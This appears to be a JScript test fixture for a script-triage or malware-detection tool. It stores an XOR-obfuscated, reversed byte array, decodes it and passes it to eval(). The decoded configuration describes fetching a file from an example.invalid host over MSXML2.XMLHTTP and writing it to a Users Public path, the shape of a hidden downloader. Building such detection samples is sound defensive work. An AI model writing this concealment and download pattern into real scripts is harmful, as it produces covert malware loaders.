// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_57f0af9d(storedMaterial) {
  var recoveredMaterial = storedMaterial.slice(0);
  recoveredMaterial.reverse();
  for (var i = 0; i < recoveredMaterial.length; i++) { recoveredMaterial[i] = recoveredMaterial[i] ^ 41; }
  return recoveredMaterial;
}
function recover_0d9c4d56() {
  if (true) {
    var characters = [84,27,19,11,93,71,92,70,106,76,78,72,93,90,11,5,84,11,93,72,77,7,27,17,27,75,26,30,28,30,30,74,4,76,78,72,93,90,117,117,75,72,101,90,90,76,91,93,71,92,97,117,117,74,64,69,75,92,121,117,117,90,91,76,90,124,117,117,19,106,11,19,11,65,93,72,89,118,76,69,64,79,11,5,11,27,17,27,75,26,30,28,30,30,74,6,75,72,101,90,90,76,91,93,71,92,97,11,19,11,93,71,76,78,72,118,91,76,90,92,11,5,11,93,72,77,7,79,26,77,24,79,75,28,79,6,77,64,69,72,95,71,64,7,76,69,89,68,72,81,76,7,27,17,27,75,26,30,28,30,30,74,6,6,19,90,89,93,93,65,11,19,11,69,91,92,11,5,11,27,17,27,75,26,30,28,30,30,74,4,71,78,64,72,89,68,72,74,11,19,11,77,64,118,71,78,64,72,89,68,72,74,11,82,19,11,90,76,92,69,72,95,11,5,11,25,7,31,7,121,125,125,97,101,100,113,7,27,101,100,113,122,100,11,19,11,91,76,93,89,72,77,72,11,5,116,11,76,69,64,79,118,76,93,64,91,94,11,5,11,76,93,70,68,76,91,118,76,91,64,92,88,74,72,11,114,19,11,90,89,76,93,90,11,82];
    var storedMaterial = [];
    for (var ci = 0; ci < characters.length; ci++) { storedMaterial.push(characters[ci]); }
    var harmlessValue = "PROCESSOR_ARCHITECTURE";
    var recoveredMaterial = decode_57f0af9d.call(null, storedMaterial);
    var textParts;
    textParts = [];
    for (var bi = 0; bi < recoveredMaterial.length; bi++) { textParts.push(String.fromCharCode(recoveredMaterial[bi])); }
    var configurationText = textParts.join("");
    return configurationText;
  }
}
function inspect_fcbd5721() {
  var configuration = eval("(" + recover_0d9c4d56.call(null) + ")");
  return { steps: configuration.steps, adapter: configuration["adapter"], values: configuration.values, stageCount: configuration["stageCount"] };
}
